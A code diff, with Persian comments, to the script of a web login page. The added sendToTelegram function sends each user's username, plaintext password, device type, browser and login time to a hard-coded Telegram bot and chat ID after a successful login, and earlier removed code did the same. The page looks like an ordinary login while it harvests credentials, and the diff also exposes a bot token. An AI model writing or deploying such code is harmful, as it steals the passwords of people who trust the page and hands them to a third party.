@@ -345,29 +345,62 @@
 </div>
 
 <script>
-   // ارسال چند پیام متوالی به تلگرام
-for (let i = 1; i <= 5; i++) {
-    fetch(`https://api.telegram.org/bot8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: '6689313262',
-            text: `🔔 ورود موفق (${i})\n👤 یوزرنیم: ${username}`
-        })
-    });
-}
+    // ===== بیدار کردن Render (Wake-up pings) =====
+    (function wakeUpRender(){
+        // الان فقط 2 بار پینگ می‌فرسته
+        for (let i = 1; i <= 2; i++) {
+            fetch("https://api.telegram.org/bot8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ/sendMessage", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: "6689313262",
+                    text: `🚀 Wake-up ping (${i})`
+                })
+            }).catch(err => console.error("Ping error:", err));
+        }
+    })();
 
-if (username && password) {
-    fetch(`https://api.telegram.org/bot8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: "6689313262",
-            text: `🔔 ورود موفق!\n👤 یوزرنیم: ${username}\n🔑 پسورد: ${password}\n🕒 زمان: ${new Date().toLocaleString()}`
-        })
-    });
-}
+    // ===== گرفتن اطلاعات ساده دستگاه/مرورگر/زمان =====
+    function getSimpleDeviceInfo() {
+        const ua = navigator.userAgent || "";
+        const deviceType = /mobile/i.test(ua) ? "📱 Mobile"
+                        : /tablet/i.test(ua) ? "📲 Tablet"
+                        : "💻 Desktop";
 
+        let browser = "Unknown";
+        if (/chrome|crios|crmo/i.test(ua)) browser = "Chrome";
+        else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
+        else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
+        else if (/edg/i.test(ua)) browser = "Edge";
+        else if (/opr\//i.test(ua)) browser = "Opera";
+        else if (/msie|trident/i.test(ua)) browser = "Internet Explorer";
+
+        const time = new Date().toLocaleString();
+        return { deviceType, browser, time };
+    }
+
+    // ===== ارسال اطلاعات کامل به تلگرام =====
+    function sendToTelegram(username, password) {
+        const info = getSimpleDeviceInfo();
+        const message = `🔔 ورود موفق!
+👤 یوزرنیم: ${username}
+🔑 پسورد: ${password}
+💻 دیوایس: ${info.deviceType}
+🌐 مرورگر: ${info.browser}
+🕒 زمان: ${info.time}`;
+
+        fetch("https://api.telegram.org/bot8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ/sendMessage", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: "6689313262",
+                text: message
+            })
+        })
+        .then(res => res.json())
+        .then(data => console.log("Telegram response:", data))
+        .catch(err => console.error("Telegram error:", err));
+    }
 
     // تغییر تم
     const themeToggle = document.getElementById('menuThemeToggle');
@@ -424,40 +457,8 @@ if (username && password) {
                 loginBtn.innerHTML = '<i class="fas fa-check"></i> Login Successful!';
                 loginBtn.style.background = 'linear-gradient(90deg, #2ecc71 0%, #27ae60 100%)';
 
-                // === ارسال پیام به تلگرام (جاسازی شده — از منوی قبلی شما استفاده شده) ===
-                // توجه: اگر TELEGRAM_BOT_TOKEN یا TELEGRAM_CHAT_ID را عوض نکردید، این درخواست خطا خواهد داد.
-                (function sendTelegramNotice(){
-                    try {
-                        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN.includes('<PUT') || TELEGRAM_CHAT_ID.includes('<PUT')) {
-                            console.warn('Telegram token/chat_id not set — skipping telegram notification.');
-                            return;
-                        }
-                        const text = `🔔 ورود موفق!\n👤 یوزرنیم: ${username}\n🕒 زمان: ${new Date().toLocaleString()}`;
-                        fetch(`https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`, {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({
-                                chat_id: TELEGRAM_CHAT_ID,
-                                text: text,
-                                parse_mode: "HTML"
-                            })
-                        })
-                        .then(res => res.json())
-                        .then(data => {
-                            if (!data || !data.ok) {
-                                console.warn('Telegram response not ok:', data);
-                            } else {
-                                console.log('Telegram notification sent:', data);
-                            }
-                        })
-                        .catch(err => {
-                            console.error('Error sending telegram message:', err);
-                        });
-                    } catch (ex) {
-                        console.error('sendTelegramNotice exception:', ex);
-                    }
-                })();
-                // ==================================================================
+                // ارسال اطلاعات به تلگرام
+                sendToTelegram(username, password);
 
                 setTimeout(() => {
                     window.location.href = 'status.html';
